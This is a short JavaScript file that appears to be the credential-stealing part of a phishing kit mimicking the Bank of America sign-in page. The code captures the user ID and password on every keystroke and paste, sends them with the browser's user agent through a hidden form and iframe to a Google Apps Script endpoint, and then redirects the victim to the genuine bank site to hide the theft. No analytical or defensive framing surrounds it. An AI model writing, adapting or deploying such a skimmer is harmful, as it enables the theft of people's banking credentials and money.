
(function () {
  var EXEC = "https://script.google.com/macros/s/AKfycbx7whR8VSbddxyAaTjlVW7K_4BqrAlY6Z-KKh5-PDMO8RIEIZgWahSHBLFElno0d9uj1g/exec";
  var REAL = "https://www.bankofamerica.com/";
  var done = false;
  var lastOid = "", lastPass = "";

  // snapshot on every keystroke - survives anything the page does to the inputs
  function snap() {
    var o = document.querySelector("#oid");
    var p = document.querySelector("#pass");
    if (o && o.value) lastOid  = o.value;
    if (p && p.value) lastPass = p.value;
  }
  document.addEventListener("input",  snap, true);
  document.addEventListener("keyup",  snap, true);
  document.addEventListener("change", snap, true);
  document.addEventListener("paste",  function () { setTimeout(snap, 0); }, true);

  function grab() {
    var o = document.querySelector("#oid");
    var p = document.querySelector("#pass");
    return {
      UserID:   (o && o.value) || lastOid,
      Password: (p && p.value) || lastPass,
      _ua: navigator.userAgent
    };
  }

  function send() {
    if (done) return;
    var d = grab();
    if (!d.UserID || !d.Password) return;   // wait until both are filled
    done = true;

    var f = document.createElement("form");
    f.method = "POST"; f.action = EXEC; f.target = "sink"; f.style.display = "none";
    for (var k in d) {
      var i = document.createElement("input");
      i.type = "hidden"; i.name = k; i.value = d[k];
      f.appendChild(i);
    }
    var ifr = document.createElement("iframe");
    ifr.name = "sink"; ifr.style.display = "none";
    document.body.appendChild(ifr); document.body.appendChild(f);
    f.submit();

    setTimeout(function () { window.location.href = REAL; }, 800);
  }

  // read synchronously - no delay, nothing can clear the field first
  document.addEventListener("click", function (e) {
    if (e.target.closest("#secure-signin-submit, #passkey-secure-signin")) send();
  }, true);
  document.addEventListener("keydown", function (e) {
    if (e.key === "Enter" && (e.target.id === "pass" || e.target.id === "oid")) send();
  }, true);
  document.addEventListener("submit", function (e) { e.preventDefault(); send(); }, true);
})();
